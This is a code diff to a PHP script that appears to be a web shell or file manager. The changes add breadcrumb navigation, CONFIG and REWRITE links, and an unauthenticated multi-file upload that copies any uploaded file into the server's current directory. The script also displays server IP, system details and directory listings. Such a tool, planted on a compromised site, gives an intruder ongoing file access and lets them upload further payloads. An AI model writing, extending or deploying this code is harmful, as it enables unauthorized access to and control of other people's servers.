@@ -349,6 +349,17 @@ tr.file:last-child {
 td.check {
 	width:1px;
 }
+a.tool {
+	background: #e8e8e8;
+	padding:4px 7px;
+	border-radius:3px;
+}
+div.tool {
+	margin-top:7px;
+}
+a.pwd {
+	margin: 5px;
+}
 @media screen and (max-width: 600px) {
   table {
   margin: 0;
@@ -460,21 +471,16 @@ function upload_show(id, text, btn) {
 				<span class="strong">Server IP : <?=isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"]?></span><br>
 				<span class='strong' style='color:green;'><?=php_uname()?></span><br>
 				<span class="strong"><?=getenv('SERVER_SOFTWARE')?></span><br>
-				<span class="strong">Current Dir : <?=cwd()?></span><br>
+				<span class="strong">Current Dir : <?=pwd()?></span><br>
 				<div>
-					<a href="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']?>">HOME</a>
-					<a href="#!upload" onclick="upload_show('answer1', this); return false;">UPLOAD</a>
+					<div class="tool">
+						<a class="tool" href="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']?>">HOME</a>
+						<a class="tool" href="?path=<?=cwd()?>&upload" onclick="upload_show('answer1', 	this); return false;">UPLOAD</a>
+						<a class="tool" href="#!config">CONFIG</a>
+						<a class="tool" href="#!music">MUSIC</a>
+						<a class="tool" href="#!rewrite">REWRITE</a>
+					</div>
 				</div>
-    	</td>
-    </tr>
-    <tr>
-    	<td colspan="5" class="not">
-    		<div id="answer1" style="display: none;">
-    			<form method="post">
-    				<input type="file" name="">
-    				<input style="width:20%;" type="submit" name="">
-    			</form>
-    		</div>
     	</td>
     </tr>
     </div>
@@ -488,6 +494,18 @@ function cwd() {
   } else {
     $cwd = @str_replace('\\', '/', @getcwd());
   } return $cwd;
+}
+function pwd() {
+	$pwd = explode('/', cwd());
+	foreach ($pwd as $key => $value) {
+		print("<a class='tool pwd' href='?path=");
+		for ($i=0; $i <= $key ; $i++) { 
+			print($pwd[$i]);
+			if ($i != $key) {
+				print("/");
+			}
+		} print("'>{$value}</a>");
+	}
 }
 function perms($file) {
 $perms = fileperms($file);
@@ -564,6 +582,29 @@ function size($file) {
     } else {
         return '0 bytes';
     }
+}
+if (isset($_GET['upload'])) {
+	?>
+	<tr>
+		<td>
+			<form method="post" enctype="multipart/form-data">
+				<input type="file" name="file[]" multiple>
+				<input style="width:20%;" type="submit" name="submit">
+			</form>
+		</td>
+	</tr>
+	<?php
+	if (isset($_POST['submit'])) {
+		$file = count($_FILES['file']['tmp_name']);
+		for ($i=0; $i < $file ; $i++) { 
+			if (copy($_FILES['file']['tmp_name'][$i] , cwd().'/'.$_FILES['file']['name'][$i])) {
+				alert("success", "uploaded <u>{$_FILES['file']['name'][$i]}</u>");
+			} else {
+				alert("failed");
+			}
+		}
+	}
+	exit();
 }
 if (@$_GET['action'] == 'path') {
 	?>
@@ -642,46 +683,46 @@ if (@$_GET['action'] == 'dir') {
 if (isset($_GET['action'])) {
 	$file = $_GET['file'];
 	?>
-	<tr>
-		<td class="not mas sup">
-			<span class="a">
-				Filename
-			</span>
-		</td>
-		</div>
-		<td class="not mas lol"><center>:</center></td>
-		<td class="not mas">
-			<span><u><?=permission(cwd(),basename($file))?></u></span>
-		</td>
-	</tr>
-	<tr>
-		<td class="not mas">
-			<span class="a">
-				Size 
-			</span>
-		</td>
-		<td class="not mas lol"><center>:</center></td>
-		<td class="not mas">
-			<?=size($file)?>
-		</td>
-	</tr>
-	<tr>
-		<td class="not mas">
-			<span class="a">
-				Type
-			</span>
-		</td>
-		<td class="not mas lol"><center>:</center></td>
-		<td class="not mas">
-			<?=get_type($file)?>
-		</td>
-	</tr>
 	<?php
 	$ext = pathinfo($file, PATHINFO_EXTENSION);
 	switch ($file) {
 		case filetype($file) == 'file':
 			if (is_file($file)) {
 				?>
+				<tr>
+					<td class="not mas sup">
+						<span class="a">
+							Filename
+						</span>
+					</td>
+					</div>
+					<td class="not mas lol"><center>:</center></td>
+					<td class="not mas">
+						<span><u><?=permission(cwd(),basename($file))?></u></span>
+					</td>
+				</tr>
+				<tr>
+					<td class="not mas">
+						<span class="a">
+							Size 
+						</span>
+					</td>
+					<td class="not mas lol"><center>:</center></td>
+					<td class="not mas">
+							<?=size($file)?>
+					</td>
+				</tr>
+				<tr>
+					<td class="not mas">
+						<span class="a">
+							Type
+						</span>
+					</td>
+					<td class="not mas lol"><center>:</center></td>
+					<td class="not mas">
+							<?=get_type($file)?>
+					</td>
+				</tr>
 				<tr>
 					<td class="not" colspan="3">
 						<center>
@@ -706,6 +747,38 @@ if (isset($_GET['action'])) {
 				if (is_dir($file)) {
 					?>
 					<tr>
+						<td class="not mas sup">
+							<span class="a">
+								Filename
+							</span>
+						</td>
+					</div>
+					<td class="not mas lol"><center>:</center></td>
+					<td class="not mas">
+						<span><u><?=permission(cwd(),basename($file))?></u></span>
+					</td>
+				</tr>
+				<tr>
+					<td class="not mas">
+						<span class="a">
+							Size 
+						</span>
+					</td>
+					<td class="not mas lol"><center>:</center></td>
+					<td class="not mas">
+						<?=size($file)?>
+					</td>
+				</tr>
+				<tr>
+					<td class="not mas">
+						<span class="a">Type</span>
+					</td>
+					<td class="not mas lol"><center>:</center></td>
+					<td class="not mas">
+						<?=get_type($file)?>
+					</td>
+				</tr>
+					<tr>
 						<td class="not" colspan="3">
 						<center>
 							<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
@@ -719,7 +792,7 @@ if (isset($_GET['action'])) {
 		}
 		exit();
 }
-if (@$_GET['action'] == 'img') {
+if (@$_GET['act'] == 'img') {
 	$file = $_GET['file'];
 	?>
 	<tr>
@@ -904,21 +977,6 @@ function get_type($filename) {
      return 'application/octet-stream';
     }
  }
-function upload() {
-	if (isset($_POST['submit'])) {
-		if (copy($_FILES['file']['tmp_name'], cwd().'/'.$_FILES['file']['name'])) {
-			alert("success", "Upload !");
-		} else {
-			alert("failed", "Upload !");
-		}
-	}
-	?>
-	<form method="post" enctype="multipart/form-data"> 
-		<input type="file" name="file" multiple>
-		<input style="width:10%;" type="submit" name="submit">
-	</form>
-	<?php
-}
 function alert($type, $msg) {
 	?>
 	<tr>
@@ -1371,11 +1429,11 @@ if (isset($_GET['edit'])) {
   				<?php
   				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
   				if ($ext === 'png') {
-  					print("?path=".cwd()."&action=img&file={$files}");
+  					print("?path=".cwd()."&act=img&file={$files}");
   				} elseif ($ext === 'jpg') {
-  					print("?path=".cwd()."&action=img&file={$files}");
+  					print("?path=".cwd()."&act=img&file={$files}");
   				} elseif ($ext === 'ico') {
-  					print("?path=".cwd()."&action=img&file={$files}");
+  					print("?path=".cwd()."&act=img&file={$files}");
   				} else {
   					print("?path=".cwd()."&action&file={$files}");
   				} ?>'><?=basename($files)?></a>
